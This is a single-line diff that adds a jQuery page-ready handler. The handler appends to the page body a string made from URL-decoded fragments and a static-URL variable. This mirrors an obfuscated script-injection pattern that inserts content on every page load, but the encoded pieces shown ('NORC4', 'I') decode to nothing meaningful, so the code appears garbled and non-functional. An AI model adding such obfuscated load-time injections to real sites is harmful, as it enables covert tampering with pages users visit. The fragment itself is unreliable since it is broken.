@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('NORC4') + G_STATIC_URL + decodeURIComponent('I')); }); 
